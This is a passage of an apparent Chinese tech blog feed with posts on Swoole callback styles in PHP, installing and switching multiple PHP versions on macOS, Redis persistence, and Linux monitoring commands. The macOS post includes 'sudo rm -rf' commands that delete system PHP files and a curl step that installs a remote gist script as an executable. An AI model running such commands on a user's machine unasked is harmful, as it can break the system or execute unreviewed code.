        <content type="html"><![CDATA[<p>最近在学习<code>Swoole</code>，顺手整理一下<code>PHP</code> 中的四种设置回调函数的方式。</p><a id="more"></a><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$server-&gt;on(&quot;request&quot;, function($request, $respone)&#123;</span><br><span class="line">  echo &quot;Http Server&quot;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="类静态函数"><a href="#类静态函数" class="headerlink" title="类静态函数"></a>类静态函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class A&#123;</span><br><span class="line">  static function onConnect($server, $fd)&#123;</span><br><span class="line">    echo &quot;UDP Server&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$server-&gt;on(&quot;connect&quot;, &quot;A::onConnect&quot;);</span><br><span class="line">$server-&gt;on(&quot;conncet&quot;, [&quot;A&quot;, &quot;onConnect&quot;]);</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$server-&gt;on(&quot;connect&quot;, &quot;callBack&quot;);</span><br><span class="line"></span><br><span class="line">function callBack($server, $fd)&#123;</span><br><span class="line">  echo &quot;Tcp Server&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 情景一</span><br><span class="line">Class A&#123;</span><br><span class="line">  public function __construct()&#123;</span><br><span class="line">    $this-&gt;server-&gt;on(&quot;open&quot;, [$this, &quot;onOpen&quot;]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public function onOpen($server, $request)&#123;</span><br><span class="line">    echo &quot;WebSocket Server&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"># 情景二</span><br><span class="line">Class A&#123;</span><br><span class="line">  function onOpen($request, $respone)&#123;</span><br><span class="line">    echo &quot;WebSocket Server&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj &#x3D; new A();</span><br><span class="line">$server-&gt;on(&quot;open&quot;, [$obj, &quot;onOpen&quot;]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在 Mac OS 上安装多版本的 PHP</title>
      <link href="/how-to-install-multiple-versions-of-php-on-mac-os/"/>
      <url>/how-to-install-multiple-versions-of-php-on-mac-os/</url>
      
        <content type="html"><![CDATA[<p>最近在Mac 上做开发，起初在搭建环境时 遇到了部分问题，加上Mac 预装的那个PHP 版本，实在是不好用，<code>php-fpm</code> 总是启不动，最后索性决定在本地自己装个多版本，可以随时自由切换。</p><blockquote><p>是否需要清除旧版本？</p></blockquote><p>因为需要在Mac 上安装其他版本，所以预装的那个版本的PHP 的存在就没啥意义了。<br>考虑到本机的其他软件可能会依赖它，为了给以后省些事，最后还是决定将预装的版本给移除掉。</p><p>事实证明移除了也没关系。</p><h2 id="移除旧版本"><a href="#移除旧版本" class="headerlink" title="移除旧版本"></a>移除旧版本</h2><p>这里说的旧版本指的是Mac 自带的PHP版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;private&#x2F;etc&#x2F;</span><br><span class="line">$ sudo rm -rfi php-fpm.conf.default php-fpm.conf php.ini.default php-fpm.d&#x2F;</span><br><span class="line"># &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">$ sudo rm -rfi php php-config phpize</span><br><span class="line"># &#x2F;usr&#x2F;lib&#x2F;</span><br><span class="line">$ sudo rm -rf php&#x2F;</span><br><span class="line"># &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">$ sudo rm -rf php-fpm</span><br><span class="line"># &#x2F;usr&#x2F;share&#x2F;</span><br><span class="line">$ sudo rm -rf php</span><br><span class="line"># &#x2F;usr&#x2F;share&#x2F;man&#x2F;man1&#x2F;</span><br><span class="line">$ sudo rm -rf php-config.1 php.1 phpize.1</span><br></pre></td></tr></table></figure><p>执行完上面这些命令就能将旧版本的PHP 彻底的从你的Mac 上移除了。</p><h2 id="安装多版本"><a href="#安装多版本" class="headerlink" title="安装多版本"></a>安装多版本</h2><p>直到2018年3月底，所有PHP 相关的brew 都由 <code>homebrew/php</code> tab 处理，但是已经弃用了，所以现在我们使用<code>homebrew/core</code>包中的可用的内容。这应该是一个更好维护但是不太完整的包。</p><p>由于<code>PHP5.6</code>和<code>PHP7.0</code>在 Homebrew 上已被弃用，因为以不被支持，虽然不建议在生产环境中使用，但还是可以在开发环境中使用这些不受支持的版本，可以参考：<a href="https://php.net/supported-versions.php" target="_blank" rel="noopener">PHP支持的版本</a>。</p><p>请记住，Homebrew 正式支持PHP7.1 到 7.3 ，因此如果要安装 PHP5.6或PHP7.0，则需要执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ brew tap shivammathur&#x2F;php</span><br><span class="line">Updating Homebrew...</span><br><span class="line">&#x3D;&#x3D;&gt; Auto-updated Homebrew!</span><br><span class="line">Updated 1 tap (homebrew&#x2F;core).</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>接下来正式开始安装PHP 的各种版本，并使用简单的脚本来进行版本之间的切换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ brew install shivammathur&#x2F;php&#x2F;php@5.6</span><br><span class="line">$ brew install shivammathur&#x2F;php&#x2F;php@7.0</span><br><span class="line">$ brew install shivammathur&#x2F;php&#x2F;php@7.1</span><br><span class="line">$ brew install shivammathur&#x2F;php&#x2F;php@7.2</span><br><span class="line">$ brew install shivammathur&#x2F;php&#x2F;php@7.3</span><br></pre></td></tr></table></figure><p>第一个安装所花费的时间长一些，因为需要安装一堆brew 的依赖，随后其他版本的安装的将很快。</p><p>所安装各版本的PHP都在该目录下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php</span><br><span class="line">5.6 7.0 7.1 7.2 7.3</span><br><span class="line"></span><br><span class="line"># php.ini 配置文件目录</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;x.x&#x2F;php.ini</span><br></pre></td></tr></table></figure><p>安装完以上版本的PHP 之后，执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ php -v </span><br><span class="line">PHP 7.3.5 (cli) (built: May  2 2019 12:40:36) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.3.5, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.3.5, Copyright (c) 1999-2018, by Zend Technologies</span><br></pre></td></tr></table></figure><p>可以看到目前所使用的PHP 版本是7.3（最后安装完的那个），现在试图切换到第一个安装的PHP 版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew unlink php@7.3 &amp;&amp; brew link --force --overwrite php@5.6</span><br></pre></td></tr></table></figure><p><code>unlick</code> 安装PHP 版本之间不再需要联系，因为默认情况下他们是没有符号链接。</p><p>再次查看当前版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ php -v</span><br><span class="line">PHP 5.6.40 (cli) (built: Apr 23 2019 11:14:34)</span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies</span><br></pre></td></tr></table></figure><p>切换的挺顺利的，但如果每次需要切换时都需要这样输入就变得很麻烦了，幸运的是，一些勤劳的人已经为我们完成了艰苦的工作，并编写了一个非常方便的脚本——<a href="https://gist.github.com/rhukster/f4c04f1bf59e0b74e335ee5d186a98e2" target="_blank" rel="noopener">PHP切换器脚本</a>。</p><p>将<code>sphp</code>脚本安装到 brew 的标准中<code>/usr/local/bin</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -L https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;rhukster&#x2F;f4c04f1bf59e0b74e335ee5d186a98e2&#x2F;raw &gt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp</span><br><span class="line">$ chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp</span><br></pre></td></tr></table></figure><h2 id="多版本切换"><a href="#多版本切换" class="headerlink" title="多版本切换"></a>多版本切换</h2><p>完成这些步骤后，就能够使用脚本命令切换PHP版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sphp 7.2</span><br></pre></td></tr></table></figure><p>使用时会需要提供管理员密码，相比长长的命令这已经省事很多了。</p><p>好了，到这里就顺利的完成了多版本的PHP 安装以及切换。</p><h3 id="管理-PHP-服务"><a href="#管理-PHP-服务" class="headerlink" title="管理 PHP 服务"></a>管理 PHP 服务</h3><p>在不需要切换版本时，使用<code>brew services</code>命令可以对该版本的PHP 进行管理：</p><p>启动/停止/重启 PHP服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew services start&#x2F;stop&#x2F;restart php</span><br></pre></td></tr></table></figure><p>当PHP 服务启动时，通过查看进程列表，可以发现多了几个名为<code>php-fpm</code> 的进程。</p><p><code>php-fpm</code>的进程所在目录：<code>/usr/local/opt/php/sbin/php-fpm</code></p><p>这个进程很重要，在与 Nginx 交互时，如果没有启动它，通常会收到 <code>502 Bad Gateway</code> 的错误。</p><p>尽管不需要刻意的去管理这个进程，但如果这个进程意外停止运行了，还是要知道该如何启动它。</p><h4 id="前台启动"><a href="#前台启动" class="headerlink" title="前台启动"></a>前台启动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;</span><br><span class="line">$ .&#x2F;php-fpm</span><br></pre></td></tr></table></figure><p>用这种方式启动，当使用<code>⌃ C</code>退出时，进程也会跟着退出。</p><h4 id="后台启动"><a href="#后台启动" class="headerlink" title="后台启动"></a>后台启动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;</span><br><span class="line">$ .&#x2F;php-fpm &amp;</span><br></pre></td></tr></table></figure><p>如果用这种方式启动，就算退出了当前会话，进程会以守护进程的方式运行着。</p><h2 id="检查PHP-版本"><a href="#检查PHP-版本" class="headerlink" title="检查PHP 版本"></a>检查PHP 版本</h2><p>最后再啰嗦两句，如果需要把当前5.6版本切换成7.2，那么需要分别做两件事：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 第一步</span><br><span class="line">$ sphp 7.2</span><br><span class="line"></span><br><span class="line"># 第二步</span><br><span class="line">$ brew services stop php@5.6</span><br><span class="line">$ brew services start php@7.2</span><br></pre></td></tr></table></figure><p>如果只做了第一步，那么你会发现 <code>php -v</code>的版本输出的确是 7.2，但<code>php_info()</code>所打印的结果却还是 5.6。</p><p>这是因为机器上安装了多个PHP 版本，当使用<code>php -v</code>命令时，它将显示默认<code>PHP CLI</code>的版本，而该版本可能不是网站所使用的版本。</p><p>所以找出用于特定网站的PHP 版本的最可靠方法是使用<code>phpinfo()</code>函数。</p><hr><p><code>php cli</code> 可以正常访问，但是Web 服务却没有办法访问，这是因为安装了PHP，所以可以通过命令行直接访问，但是 <code>php-fpm</code> 却没有启动，所以Web 服务没法正常访问。</p><p>启动Web 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/Cellar/php/8.1.1/sbin</span><br><span class="line">./php-fpm</span><br></pre></td></tr></table></figure><p>sphp 这个脚本所做的事情等于以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> brew unlink php@7.3 &amp;&amp; brew link --force --overwrite php@5.6</span></span><br></pre></td></tr></table></figure><p>只是改变了命令行的版本，Web 服务最终还是要以允许的<code>php-fpm</code> 为准。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://segmentfault.com/a/1190000005090828#articleHeader0" target="_blank" rel="noopener">Mac 下 Nginx、PHP、MySQL 和 PHP-fpm 的安装和配置</a></li><li><a href="https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions" target="_blank" rel="noopener">如何在Mac 上安装多版本的PHP</a></li><li><a href="https://mengkang.net/343.html" target="_blank" rel="noopener">如何卸载Mac 预装的PHP</a></li><li><a href="https://linuxize.com/post/how-to-check-php-version/" target="_blank" rel="noopener">如何检查PHP 版本</a></li><li><a href="https://exerror.com/error-php7-3-has-been-disabled-because-it-is-a-versioned-formula/" target="_blank" rel="noopener">Error: php@7.3 has been disabled because it is a versioned formula!</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 持久化快速上手</title>
      <link href="/redis-persistence-quick-start/"/>
      <url>/redis-persistence-quick-start/</url>
      
        <content type="html"><![CDATA[<blockquote><p>什么是持久化？</p></blockquote><p>Redis 所有数据都是存储在内存中的，对于数据的更新将异步的保存在磁盘中，当Redis实例重启时，即可利用之前持久化的文件实现数据恢复。</p><a id="more"></a><p>主流数据库的持久化方式：</p><ul><li>快照<ul><li>Mysql dump</li><li>Redis rdb</li></ul></li><li>日志<ul><li>Mysql binlog</li><li>Redis aof</li></ul></li></ul><h2 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h2><h3 id="什么是RDB？"><a href="#什么是RDB？" class="headerlink" title="什么是RDB？"></a>什么是RDB？</h3><p>Redis 通过一条命令或者某种方式创建 rdb 文件，该文件是二进制格式，存储在硬盘中。</p><p>当需要对Redis 进行恢复时，就可以去加载该文件。数据恢复的程度，取决于 rdb文件（快照）产生的时刻。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123200707.png" alt=""></p><h3 id="三种触发机制"><a href="#三种触发机制" class="headerlink" title="三种触发机制"></a>三种触发机制</h3><p>Redis 生成 rdb 文件有三种方式，分别是：</p><ul><li>save</li><li>bgsave</li><li>自动策略</li></ul><h4 id="save"><a href="#save" class="headerlink" title="save"></a>save</h4><p>save 命令有如下特点：</p><ol><li>同步阻塞</li><li>文件策略：如果存在旧的rdb 文件，则会替换成新的</li><li>复杂度：O（N）</li></ol><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123200752.png" alt=""></p><h4 id="bgsave"><a href="#bgsave" class="headerlink" title="bgsave"></a>bgsave</h4><p>bgsave 命令有如下特点：</p><ul><li>异步非阻塞（几乎不会阻塞客户端）</li><li>文件策略和复杂度同上。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123200804.png" alt=""></p><blockquote><p>save 还是 bgsave？</p></blockquote><table><thead><tr><th>命令</th><th>save</th><th>bgsave</th></tr></thead><tbody><tr><td>IO类型</td><td>同步</td><td>异步</td></tr><tr><td>是否阻塞</td><td>是</td><td>否（阻塞发生在fork()</td></tr><tr><td>复杂度</td><td>O(n)</td><td>O(n)</td></tr><tr><td>优点</td><td>不会消耗额外内存</td><td>不阻塞客户端</td></tr><tr><td>缺点</td><td>阻塞客户端</td><td>需要fork，消耗内存</td></tr></tbody></table><p>在数据量不大的情况下，其实使用save 还是bgsave 并没有什么差异。</p><p>它俩都是需要手动执行命令才会触发机制，那么有没有自动的方式呢？答案是有的。</p><h4 id="自动策略"><a href="#自动策略" class="headerlink" title="自动策略"></a>自动策略</h4><p>自动生成策略是根据某个规则来决定是否生成 rdb 文件，这个过程也是一个bgsave 的过程。</p><p>默认策略：<br>|seconds|changes|<br>|-|-|<br>|900|1|<br>|300|10|<br>|60|10000|</p><p>上述配置的意思是：如果在60s 中做了10000 次改变或者在 300s 中做了 10次 改变，或者在900s 中做了 1 次改变，则均会触发bgsave。</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#save 900 1</span><br><span class="line">#save 300 10 </span><br><span class="line">#save 60 10000</span><br><span class="line">dbfilename dump.rdb       &#x2F;&#x2F; rdb 文件名称</span><br><span class="line">dir &#x2F;big_disk_path                &#x2F;&#x2F; 工作目录</span><br><span class="line">stop-writes-on-bgsave-error yes   &#x2F;&#x2F; 如果发生错误，停止写入</span><br><span class="line">rdbcompression yes                &#x2F;&#x2F; 采用压缩格式 </span><br><span class="line">rdbchecksum yes                   &#x2F;&#x2F; 对rdb 文件进行检验</span><br></pre></td></tr></table></figure><h3 id="触发机制"><a href="#触发机制" class="headerlink" title="触发机制"></a>触发机制</h3><p>Redis 当达到以下触发机制时，也会自动创建rdb 文件。</p><ol><li>全量复制</li><li>debug reload</li><li>showdown</li></ol><h3 id="RDB-文件恢复"><a href="#RDB-文件恢复" class="headerlink" title="RDB 文件恢复"></a>RDB 文件恢复</h3><p>前面已经提到过了，持久化的目的是为了解决内存异常导致的数据丢失问题，如果真的遇到了这样的情况，RDB 文件又是如何实现数据恢复的呢？</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123200830.png" alt=""></p><p>因为开启持久化之后，数据会存储到名为 dump.rdb 的文件中，当 Redis 服务器重启时，检测到 dump.rdb 文件后，就会自动加载进行数据恢复。</p><h2 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h2><p>在正式介绍什么是AOF 之前，我们先来了解一下RDB 方式现存的问题。</p><ol><li>耗时、耗性能</li><li>不可控、丢失数据</li></ol><h3 id="什么是AOF？"><a href="#什么是AOF？" class="headerlink" title="什么是AOF？"></a>什么是AOF？</h3><p>与RDB 不同的是，它是通过保存所执行的写命令来实现的，并且保存的数据格式是客户端发送的命令。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123200915.png" alt=""></p><h3 id="三种策略"><a href="#三种策略" class="headerlink" title="三种策略"></a>三种策略</h3><p>Redis 在执行写命令时，首先写入硬盘的缓冲区，缓冲区会根据以下三种策略去刷新到磁盘中。</p><ul><li>always：每次写入都把缓冲区 fsync 到硬盘，性能影响最大，占用磁盘 IO 较高，数据安全性最高。</li><li>everysec：每秒把缓冲区 fsync 到硬盘，对性能影响相对较小。</li><li>no：由系统决定是否 fsync。</li></ul><blockquote><p>always 还是 everysec 还是 no？</p></blockquote><table><thead><tr><th>命令</th><th>always</th><th>everysec</th><th>no</th></tr></thead><tbody><tr><td>优点</td><td>不丢失数据</td><td>每秒一次 fsync</td><td>不用管</td></tr><tr><td>缺点</td><td>IO 开销较大，一般的sata 盘只有几百 TPS</td><td>丢一秒数据</td><td>不可控</td></tr></tbody></table><h3 id="AOF-重写"><a href="#AOF-重写" class="headerlink" title="AOF 重写"></a>AOF 重写</h3><p>来看这样一种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set name php </span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name c</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name python</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name js</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get name </span><br><span class="line">&quot;js&quot;</span><br></pre></td></tr></table></figure><p>虽然set 了很多次，但是name 的值，只受最后一次set 的影响，所以前面那么多次，其实没有必要也保存到AOF 文件中。</p><p>满足所设置的条件时，会自动触发 AOF 重写，此时 Redis 会扫描整个实例的数据，重新生成一个 AOF 文件来达到瘦身的效果。</p><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; AOF</span><br><span class="line">appendonly yes                              &#x2F;&#x2F; 开启AOF 策略</span><br><span class="line">appendfilename &quot;appendonly-$&#123;port&#125;.aof&quot;     &#x2F;&#x2F; aof 文件名</span><br><span class="line">appendfsync everysec                        &#x2F;&#x2F; 刷新策略</span><br><span class="line">dir &#x2F;big_disk_path                          &#x2F;&#x2F; 工作目录</span><br><span class="line">no-appendfsync-on-write  yes                &#x2F;&#x2F; AOF 重写时，是否需要做AOF 检测操作</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; AOF 重写</span><br><span class="line">auto-aof-rewrite-percentage 100             &#x2F;&#x2F; AOF 文件距离上次文件增长超过多少百分比</span><br><span class="line">auto-aof-rewrite-min-size 64mb              &#x2F;&#x2F; AOF 文件体积最小多大以上触发</span><br></pre></td></tr></table></figure><h3 id="AOF-文件恢复"><a href="#AOF-文件恢复" class="headerlink" title="AOF 文件恢复"></a>AOF 文件恢复</h3><p>与 RBD 文件不同，因为AOF 文件的数据格式，是由命令组成的，所以客户端直接执行每条命令就可以将数据进行恢复。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201123202704.png" alt=""></p><blockquote><p>RDB 还是AOF？</p></blockquote><p>RDB 和AOF 有各自的优缺点，那么到底该选择哪个呢？ 并没有绝对正确的答案。需要根据实际情况去作取舍，不过通常都是使用混合持久化的方式。</p><table><thead><tr><th>命令</th><th>RDB</th><th>AOF</th></tr></thead><tbody><tr><td>启动优先级</td><td>低</td><td>高</td></tr><tr><td>体积</td><td>小</td><td>大</td></tr><tr><td>恢复速度</td><td>快</td><td>慢</td></tr><tr><td>数据安全性</td><td>丢数据</td><td>根据策略决定</td></tr><tr><td>级别</td><td>重</td><td>轻</td></tr></tbody></table><h3 id="混合持久化"><a href="#混合持久化" class="headerlink" title="混合持久化"></a>混合持久化</h3><p>混合持久化是通过 <code>aof-use-rdb-preamble</code> 参数来开启的。它的操作方式是这样的，在写入的时候先把数据以 RDB 的形式写入文件的开头，再将后续的写命令以 AOF 的格式追加到文件中。这样既能保证数据恢复时的速度，同时又能减少数据丢失的风险。</p><p>那么混合持久化中是如何来进行数据恢复的呢？在 Redis 重启时，先加载 RDB 的内容，然后再重放增量 AOF 格式命令。这样就避免了 AOF 持久化时的全量加载，从而使加载速率得到大幅提升。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>RDB持久化</p><ul><li>将某一时刻的数据以二进制形式写入到磁盘里，服务重启时检测到对应文件自动加载进行数据恢复。</li><li>有手动触发和自动触发两种机制。</li></ul><p>AOF持久化</p><ul><li>以文件追加的方式写入客户端执行的写命令。</li><li>数据恢复时，通过创建伪客户端的方式执行命令，直到恢复完成。</li></ul><p>混合持久化</p><ul><li>在写入的时候先把数据以 RDB 的形式写入文件的开头，再将后续的写命令以 AOF 的格式追加到文件中。</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://mp.weixin.qq.com/s/ZBDOsSGnBAr0rM37Dih_ng" target="_blank" rel="noopener">老半天，终于把 redis 持久化搞懂了</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 持久化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统监控命令整理汇总</title>
      <link href="/summary-of-linux-system-monitoring-commands/"/>
      <url>/summary-of-linux-system-monitoring-commands/</url>
      
        <content type="html"><![CDATA[<p>以下命令以Ubuntu 18.04 LTS 系统为准。</p><a id="more"></a><table><thead><tr><th>命令</th><th>功能</th><th>实例</th></tr></thead><tbody><tr><td>free</td><td>查看内存使用情况，包括物理内存和虚拟内存</td><td>free -h 或 free -m</td></tr><tr><td>vmstat</td><td>对系统的整体情况进行统计，包括内核进程、虚拟内存、磁盘、陷阱和 CPU 活动的统计信息</td><td>vmstat 2 100</td></tr><tr><td>top</td><td>实时显示系统中各个进程的资源占用状况及总体状况</td><td>top</td></tr><tr><td>mpstat</td><td>实时系统监控工具，它会报告与CPU相关的统计信息</td><td>mpstat</td></tr><tr><td>sar</td><td>收集、报告和保存CPU、内存、输入输出端口使用情况</td><td>sar -n DEV 3 100</td></tr><tr><td>netstat</td><td>检验本机各端口的网络连接情况，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据</td><td>netstat -a</td></tr><tr><td>tcpdump</td><td>用于捕捉或者过滤网络上指定接口上接收或者传输的TCP/IP包</td><td>tcpdump -i eth0 -c 3</td></tr><tr><td>iptraf</td><td>用来生成包括TCP信息、UDP计数、ICMP和OSPF信息、以太网负载信息、节点状态信息、IP校验和错误等等统计数据</td><td>iptraf</td></tr><tr><td>iostat</td><td>收集显示系统存储设备输入和输出状态统计</td><td>iostat -x -k 2 100</td></tr><tr><td>lsof</td><td>查看进程打开的文件的工具，查看监听端口</td><td>lsof -i :3000</td></tr><tr><td>atop</td><td>显示的是各种系统资源（CPU, memory, network, I/O, kernel）的综合，并且在高负载的情况下进行了彩色标注</td><td>atop</td></tr><tr><td>htop</td><td>它和top命令十分相似，高级的交互式的实时linux进程监控工具</td><td>htop</td></tr><tr><td>ps</td><td>最基本同时也是非常强大的进程查看命令</td><td>ps aux</td></tr><tr><td>glances</td><td>监视 CPU，平均负载，内存，网络流量，磁盘 I/O，其他处理器 和 文件系统 空间的利用情况</td><td>glances</td></tr><tr><td>dstat</td><td>全能系统信息统计工具，可用于替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的工具</td><td>dstat</td></tr><tr><td>uptime</td><td>用于查看服务器运行了多长时间以及有多少个用户登录，快速获知服务器的负荷情况</td><td>uptime</td></tr><tr><td>dmesg</td><td>主要用来显示内核信息。使用dmesg可以有效诊断机器硬件故障或者添加硬件出现的问题</td><td>dmesg</td></tr><tr><td>mpstat</td><td>用于报告多路CPU主机的每颗CPU活动情况，以及整个主机的CPU情况</td><td>mpstat 2 3</td></tr><tr><td>nmon</td><td>监控CPU、内存、I/O、文件系统及网络资源。对于内存的使用，它可以实时的显示 总/剩余内存、交换空间等信息</td><td>nmon</td></tr><tr><td>mytop</td><td>用于监控 mysql 